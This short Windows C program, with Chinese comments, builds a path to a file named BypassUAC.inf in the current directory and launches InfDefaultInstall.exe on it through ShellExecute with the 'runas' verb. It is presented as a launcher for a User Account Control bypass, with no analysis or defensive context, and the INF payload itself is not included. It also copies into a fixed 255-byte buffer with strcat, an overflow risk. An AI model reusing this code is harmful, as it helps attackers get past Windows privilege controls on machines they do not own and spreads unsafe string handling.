#include <windows.h>
#include <stdio.h>

int main()
{
	char pBuf[255];								//存放路径的变量
	GetCurrentDirectory(255,pBuf);				//获取程序的当前目录
	strcat(pBuf,"\\BypassUAC.inf");				//比如c:\BypassUAC.inf
	ShellExecute(NULL,"runas","c:\\windows\\system32\\InfDefaultInstall.exe",pBuf,0,SW_SHOWNORMAL);
	return 0;
}
